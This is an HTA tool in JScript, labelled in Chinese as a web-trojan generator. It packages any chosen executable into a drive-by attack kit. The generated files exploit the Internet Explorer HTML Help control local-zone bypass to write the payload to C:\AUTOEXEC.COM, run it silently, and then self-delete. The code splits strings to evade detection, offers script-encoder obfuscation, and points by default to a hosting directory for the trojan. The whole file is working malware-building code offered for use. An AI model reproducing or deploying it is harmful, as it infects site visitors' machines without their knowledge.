<script language="JScript">
window.resizeTo(450,310);
window.moveTo(200,200);
</script>
<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>网页木马生成器 For A&S</title> 
<HTA:Application
APPLICATIONNAME="HHCtrl Wymm Maker"
border="normal"  
caption="yes"
ICON="%SystemRoot%\system32\winmine.exe"
maximizebutton="no"  
minimizebutton="yes"  
sysmenu="yes"  
windowstate="normal"
VERSION="0.1 beta"
> 
<SCRIPT LANGUAGE="JScript">
<!--

function make()
{
 var filesrc,url;
 filesrc=document.getElementById("filesrc").value;
 url=document.getElementById("url").value;
 
 if(filesrc.length<1)
 { 
  document.getElementById("filesrc").focus();
  alert("请选择文件");
 }
 else if(url.length<1)
 {
  document.getElementById("url").focus();
  alert("请输入网址");
 }
 else
 {
  try
  {
   var asm=new ActiveXObject("ADODB.Stream");
   asm.Type=1;
   asm.Mode=3;
   asm.Open();
   asm.LoadFromFile(filesrc);
   
   try{
    Save("cn.js",makecnjs(makecnhta(encodeBase64(asm.Read()))));
    alert("生成cn.js文件成功");
   }catch(e){alert("生成cn.js文件时产生错误");}
   
   asm.Close();   
   try{
    Save("fo.htm",makefohtm(url));
    alert("生成fo.htm文件成功");
    }catch(e){alert("生成fo.htm文件时产生错误");}
  }
  catch(e)
  {
   alert("Sorry !\nI'm faild to make it!");
  }
 }  
}
function makecnhta(data)
{
  var htm="<script language=\"JScript\">window.resizeTo(0,0);window.moveTo(3000,3000);<\/script><html> <head> <HTA:APPLICATION ID=\"focn\" BORDER=\"none\" CAPTION=\"no\" SHOWINTASKBAR=\"none\"><script language=\"JScript\">function exec(){var data,filename;data =document.getElementById(\"divData\").innerText;filename = \"C:\\\\AUT\"+\"OEX\"+\"EC.CO\"+\"M\";SaveAndRun(filename,decodeBase64(data));selfdelete();window.opener = null;window.close();}function SaveAndRun(filename,data){try{var asm = new ActiveXObject(\"ADO\"+\"DB\" + \".\" + \"St\"+\"ream\");var wsho = new ActiveXObject(\"WScr\"+\"ip\"+\"t.Sh\"+\"ell\");asm.Type = 1;asm.Open();asm.write(data);asm.SaveToFile(filename,2);asm.Close();wsho.Run(filename,0,false); } catch(e){}}function decodeBase64(str){try{var xml = new ActiveXObject(\"MSX\"+\"ML2.DO\"+\"MDocument\"); xml.loadXML(\"<?xml version=\\\"1.0\\\"?>\");var root  =  xml.createElement(\"file1\"); root.setAttribute(\"xmlns:dt\", \"urn:schemas-microsoft-com:datatypes\"); root.dataType=\"\";root.nodeTypedValue=str;root.dataType=\"bin.base64\";xml.appendChild(root); return xml.selectSingleNode(\"file1\").nodeTypedValue;}catch(e){}}function selfdelete(){try{var filename = document.location.href;filename = filename.substring(filename.indexOf(\"\/\")+3,filename.length);var fso, MyFile;fso = new ActiveXObject(\"Sc\"+\"ript\"+\"ing.File\"+\"Syst\"+\"emObject\");MyFile = fso.GetFile(filename);MyFile.Delete()}catch(e){}}<\/script><\/head><body onload=\"exec();\"><div id=\"divData\"style=\"display:none;\">";
  htm=htm+data+"<\/div>\n<\/body>\n<html>" 
     if(document.getElementById("Encode").checked)
   return screncode(htm,"htm");
     else
  return htm;
}

function makecnjs(cnhta)
{
 var htm="var%20htaa%3D%27"; htm=htm+escape(escape(cnhta))+"%27%3Bvar%20htab%3D%27%3Cobject%20id%3D%22cn1%22%20type%3D%22application/x-oleobject%22%20classid%3D%22clsid%3Aadb880a6-d8ff-11cf-9377-00aa003b7a11%22%3E%3Cparam%20name%3D%22Command%22%20value%3D%22shortcut%22%3E%3Cparam%20name%3Ditem1%20value%3D%22%2Cc%3A%5C%5CNTDETECT.hta%22%3E%3C/object%3E%3COBJECT%20id%3D%22cn2%22%20type%3D%22application/x-oleobject%22%20classid%3D%22clsid%3Aadb880a6-d8ff-11cf-9377-00aa003b7a11%22%3E%3Cparam%20name%3D%22Command%22%20value%3D%22Close%22%3E%3C%5C/object%3E%3Cscript%3Ecn1.Click%28%29%3Bcn2.Click%28%29%3B%3C%5C/script%3E%27%3B%0D%0Atry%0D%0A%7B%0D%0A%09o%3Dnew%20ActiveXObject%28%22ADODB.Recordset%22%29%3B%0D%0A%09o.Fields.Append%28%22a%22%2C200%2C3000%29%3B%0D%0A%09o.Open%28%29%3B%0D%0A%09o.AddNew%28%29%3B%0D%0A%09o.Fields%28%22a%22%29.Value%3Dunescape%28htaa%29%3B%0D%0A%09o.Update%28%29%3B%0D%0A%7D%0D%0Acatch%28e%29%7B%7D%0D%0Atry%0D%0A%7B%0D%0A%09var%20fi%3D%22c%3A%5C%5CNTDETECT.hta%22%3B%0D%0A%09o.Save%28fi%2C0%29%3B%0D%0A%09%0D%0A%7D%0D%0Acatch%28e%29%7B%7D%0D%0Adocument.write%28htab%29%3B%0D%0A";
 if(document.getElementById("Encode").checked)
  return screncode("document.write(unescape('<script>"+htm+"<\/script>'));","Js");
 else
  return "document.write(unescape('<script>"+htm+"<\/script>'));"

}
function makefohtm(url)
{
 var htm="<script>document.write(unescape('"
 htm=htm+"%3CHTML%3E%0D%0A%3Chead%3E%0D%0A%3C/head%3E%0D%0A%3CBODY%3E%0D%0A%3Cdiv%20style%3D%22display%3Anone%22%3E%0D%0A%3COBJECT%20id%3D%22f1%22%0D%0Atype%3D%22application/x-oleobject%22%0D%0Aclassid%3D%22clsid%3Aadb880a6-d8ff-11cf-9377-00aa003b7a11%22%3E%0D%0A%3CPARAM%20name%3D%22Command%22%20value%3D%22Related%20Topics%2C%20MENU%22%3E%0D%0A%3CPARAM%20name%3D%22Window%22%20value%3D%22%24global_ifl%22%3E%0D%0A%3CPARAM%20name%3D%22Item1%22%20value%3D%27command%3Bfile%3A//c%3A%5CWINDOWS%5CHelp%5Capps.chm%27%3E%0D%0A%3C/OBJECT%3E%0D%0A%3COBJECT%20id%3D%22f2%22%20type%3D%22application/x-oleobject%22%20classid%3D%22clsid%3Aadb880a6-d8ff-11cf-9377-00aa003b7a11%22%3E%0D%0A%3CPARAM%20name%3D%22Command%22%20value%3D%22Related%20Topics%2C%20MENU%22%3E%0D%0A%3CPARAM%20name%3D%22Window%22%20value%3D%22%24global_ifl%22%3E%0D%0A%3CPARAM%20name%3D%22Item1%22%20value%3D%27command%3Bjavascript%3Aeval%28%22document.write%28%5C%22%3CSCRIPT"
 if(document.getElementById("Encode").checked)
  htm=htm+"%20language%2520%253D%2520JScript.Encode%20"
 htm=htm+"%20src%3D%5C%5C%5C%22"+escape(url+"cn.js"); htm=htm+"%5C%5C%5C%22%5C%22+String.fromCharCode%2862%29+%5C%22%3C/SCR%5C%22+%5C%22IPT%5C%22+String.fromCharCode%2862%29%29%22%29%27%3E%0D%0A%3C/OBJECT%3E%0D%0A%3C/div%3E%0D%0A%3Cscript%3E%0D%0Af1.Click%28%29%3BsetTimeout%28%22f2.Click%28%29%3B%22%2C0%29%3B%0D%0A%3C/script%3E%0D%0A%3C/BODY%3E%0D%0A%3C/HTML%3E";
 htm=htm+"'));<\/script>";
 
 if(document.getElementById("Encode").checked)
   return screncode(htm,"htm");
    else
   return htm;
}
function encodeBase64(str)
{
 var xml = new ActiveXObject("MSXML2.DOMDocument");
 xml.loadXML("<?xml version=\"1.0\"?>"); 
 var root  =  xml.createElement("file1");
 root.setAttribute("xmlns:dt", "urn:schemas-microsoft-com:datatypes");
 root.dataType="bin.base64";
 root.nodeTypedValue=str;
 root.dataType="";
 xml.appendChild(root);
 return xml.selectSingleNode("file1").nodeTypedValue;
}

function Save(filename,data)
{ 
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var f = fso.OpenTextFile(filename, 2, true);
 f.Write(data);
}

function screncode(str,l){
 enc=new ActiveXObject("Scripting.Encoder");
 return enc.EncodeScriptFile("."+l,str,0,"JScript");
}

//-->
</SCRIPT>

<style type="text/css">
<!--
body,td,th {
 font-size: 9pt;
}
body {
 margin-left: 0px;
 margin-top: 0px;
}
.style1 {color: #990000}
.style2 {color: #660066}
.style3 {color: #0000FF}

-->
</style></head> 
<body bgcolor="#CCCCFF"><br><br>
<table width="315" height="111" border="0" align="center">
  <tr>
    <td width="60" height="25" nowrap class="style1">选择文件</td>
    <td colspan="3" nowrap><input type="file" name="filesrc" width="200"></td>
  </tr>
  <tr>
    <td height="25"><span class="style3">存放目录</span></td>
    <td width="231"><input name="url" type="text" value="http://cn90.net/MuMa/" width="230"></td>
   
 
  </tr>
  <tr>
    <td height="25" nowrap><span class="style3">是否加密</span></td>
    <td colspan="2" nowrap><input name="Encode" type="checkbox" id="Encode" ></td>

  </tr>
  <tr>
    <td nowrap>&nbsp;</td>
    <td nowrap><input type="button" name="Submit" value="生 成" OnClick="make();">
    <input name="exit" type="button" id="bt17" onClick="self.close();" value="退 出"></td>
   
  </tr>
</table>
<table width="315" height="68" border="0" align="center">
  <tr>
    <td valign="top"><p class="style2">说明：将生成fo.htm和cn.js两个文件，其中fo.htm为首调用页。存放目录请填将存放马的网页路径，不要指定文件名。加密采用的是EnCode的加密。有弹出窗口问题未解决。利用的是Help Control Local Zone Bypass Exploit。</p>    </td>
  </tr>
  <tr>
    <td valign="top"><span class="style"> Compile For 网络攻防小组[A&S] 2005.12.12</span></td>
<TR>
   <td valign="top"><span class="style1"> 风之痕 [Attack and Securer Group]</span></td>
  </tr>
</table>
<p>&nbsp;</p>
</body> 
</html>
  